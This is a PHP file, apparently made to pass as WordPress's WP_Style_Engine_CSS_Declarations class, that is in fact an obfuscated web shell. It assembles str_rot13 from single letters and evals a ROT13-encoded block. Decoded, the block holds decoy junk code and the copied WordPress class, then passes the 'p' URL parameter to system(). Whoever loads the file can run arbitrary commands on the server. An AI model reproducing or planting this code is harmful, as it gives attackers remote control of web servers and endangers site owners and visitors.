<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fglyr Ratvar: JC_Fglyr_Ratvar_PFF_Qrpynengvbaf pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr FglyrRatvar
 * @fvapr 6.1.0
 */

/**
 * Pber pynff hfrq sbe fglyr ratvar PFF qrpynengvbaf.
 *
 * Ubyqf, fnavgvmrf, cebprffrf, naq cevagf PFF qrpynengvbaf sbe gur fglyr ratvar.
 *
 * @fvapr 6.1.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Fglyr_Ratvar_PFF_Qrpynengvbaf {

	/**
	 * Na neenl bs PFF qrpynengvbaf (cebcregl => inyhr cnvef).
	 *
	 * @fvapr 6.1.0
	 *
	 * @ine fgevat[]
	 */
	cebgrpgrq $qrpynengvbaf = neenl();

	/**
	 * Pbafgehpgbe sbe guvf bowrpg.
	 *
	 * Vs n `$qrpynengvbaf` neenl vf cnffrq, vg jvyy or hfrq gb cbchyngr
	 * gur vavgvny `$qrpynengvbaf` cebc bs gur bowrpg ol pnyyvat nqq_qrpynengvbaf().
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat[] $qrpynengvbaf Bcgvbany. Na nffbpvngvir neenl bs PFF qrsvavgvbaf,
	 *                               r.t. `neenl( \"$cebcregl\" => \"$inyhr\", \"$cebcregl\" => \"$inyhr\" )`.
	 *                               Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba __pbafgehpg( $qrpynengvbaf = neenl() ) {
		$guvf->nqq_qrpynengvbaf( $qrpynengvbaf );
	}

	/**
	 * Nqqf n fvatyr qrpynengvba.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $cebcregl Gur PFF cebcregl.
	 * @cnenz fgevat $inyhr    Gur PFF inyhr.
	 * @erghea JC_Fglyr_Ratvar_PFF_Qrpynengvbaf Ergheaf gur bowrpg gb nyybj punvavat zrgubqf.
	 */
	choyvp shapgvba nqq_qrpynengvba( $cebcregl, $inyhr ) {
		// Fnavgvmrf gur cebcregl.
		$cebcregl = $guvf->fnavgvmr_cebcregl( $cebcregl );
		// Onvyf rneyl vs gur cebcregl vf rzcgl.
		vs ( rzcgl( $cebcregl ) ) {
			erghea $guvf;
		}

		// Gevzf gur inyhr. Vs rzcgl, onvy rneyl.
		$inyhr = gevz( $inyhr );
		vs ( '' === $inyhr ) {
			erghea $guvf;
		}

		// Nqqf gur qrpynengvba cebcregl/inyhr cnve.
		$guvf->qrpynengvbaf[ $cebcregl ] = $inyhr;

		erghea $guvf;
	}

	/**
	 * Erzbirf n fvatyr qrpynengvba.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $cebcregl Gur PFF cebcregl.
	 * @erghea JC_Fglyr_Ratvar_PFF_Qrpynengvbaf Ergheaf gur bowrpg gb nyybj punvavat zrgubqf.
	 */
	choyvp shapgvba erzbir_qrpynengvba( $cebcregl ) {
		hafrg( $guvf->qrpynengvbaf[ $cebcregl ] );
		erghea $guvf;
	}

	/**
	 * Nqqf zhygvcyr qrpynengvbaf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat[] $qrpynengvbaf Na neenl bs qrpynengvbaf.
	 * @erghea JC_Fglyr_Ratvar_PFF_Qrpynengvbaf Ergheaf gur bowrpg gb nyybj punvavat zrgubqf.
	 */
	choyvp shapgvba nqq_qrpynengvbaf( $qrpynengvbaf ) {
		sbernpu ( $qrpynengvbaf nf $cebcregl => $inyhr ) {
			$guvf->nqq_qrpynengvba( $cebcregl, $inyhr );
		}
		erghea $guvf;
	}

	/**
	 * Erzbirf zhygvcyr qrpynengvbaf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat[] $cebcregvrf Bcgvbany. Na neenl bs cebcregvrf. Qrsnhyg rzcgl neenl.
	 * @erghea JC_Fglyr_Ratvar_PFF_Qrpynengvbaf Ergheaf gur bowrpg gb nyybj punvavat zrgubqf.
	 */
	choyvp shapgvba erzbir_qrpynengvbaf( $cebcregvrf = neenl() ) {
		sbernpu ( $cebcregvrf nf $cebcregl ) {
			$guvf->erzbir_qrpynengvba( $cebcregl );
		}
		erghea $guvf;
	}

	/**
	 * Trgf gur qrpynengvbaf neenl.
	 *
	 * @fvapr 6.1.0
	 *
	 * @erghea fgevat[] Gur qrpynengvbaf neenl.
	 */
	choyvp shapgvba trg_qrpynengvbaf() {
		erghea $guvf->qrpynengvbaf;
	}

	/**
	 * Svygref n PFF cebcregl + inyhr cnve.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $cebcregl Gur PFF cebcregl.
	 * @cnenz fgevat $inyhr    Gur inyhr gb or svygrerq.
	 * @cnenz fgevat $fcnpre   Bcgvbany. Gur fcnpre orgjrra gur pbyba naq gur inyhr.
	 *                         Qrsnhyg rzcgl fgevat.
	 * @erghea fgevat Gur svygrerq qrpynengvba be na rzcgl fgevat.
	 */
	cebgrpgrq fgngvp shapgvba svygre_qrpynengvba( $cebcregl, $inyhr, $fcnpre = '' ) {
		$svygrerq_inyhr = jc_fgevc_nyy_gntf( $inyhr, gehr );
		vs ( '' !== $svygrerq_inyhr ) {
			erghea fnsrpff_svygre_ngge( \"{$cebcregl}:{$fcnpre}{$svygrerq_inyhr}\" );
		}
		erghea '';
	}

	/**
	 * Svygref naq pbzcvyrf gur PFF qrpynengvbaf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz obby $fubhyq_cerggvsl Bcgvbany. Jurgure gb nqq fcnpvat, arj yvarf naq vaqragf.
	 *                              Qrsnhyg snyfr.
	 * @cnenz vag  $vaqrag_pbhag    Bcgvbany. Gur ahzore bs gno vaqragf gb nccyl gb gur ehyr.
	 *                              Nccyvrf vs `cerggvsl` vf `gehr`. Qrsnhyg 0.
	 * @erghea fgevat Gur PFF qrpynengvbaf.
	 */
	choyvp shapgvba trg_qrpynengvbaf_fgevat( $fubhyq_cerggvsl = snyfr, $vaqrag_pbhag = 0 ) {
		$qrpynengvbaf_neenl  = $guvf->trg_qrpynengvbaf();
		$qrpynengvbaf_bhgchg = '';
		$vaqrag              = $fubhyq_cerggvsl ? fge_ercrng( \"\g\", $vaqrag_pbhag ) : '';
		$fhssvk              = $fubhyq_cerggvsl ? ' ' : '';
		$fhssvk              = $fubhyq_cerggvsl && $vaqrag_pbhag > 0 ? \"\a\" : $fhssvk;
		$fcnpre              = $fubhyq_cerggvsl ? ' ' : '';

		sbernpu ( $qrpynengvbaf_neenl nf $cebcregl => $inyhr ) {
			$svygrerq_qrpynengvba = fgngvp::svygre_qrpynengvba( $cebcregl, $inyhr, $fcnpre );
			vs ( $svygrerq_qrpynengvba ) {
				$qrpynengvbaf_bhgchg .= \"{$vaqrag}{$svygrerq_qrpynengvba};$fhssvk\";
			}
		}

		erghea egevz( $qrpynengvbaf_bhgchg );
	}

	/**
	 * Fnavgvmrf cebcregl anzrf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $cebcregl Gur PFF cebcregl.
	 * @erghea fgevat Gur fnavgvmrq cebcregl anzr.
	 */
	cebgrpgrq shapgvba fnavgvmr_cebcregl( $cebcregl ) {
		erghea fnavgvmr_xrl( $cebcregl );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>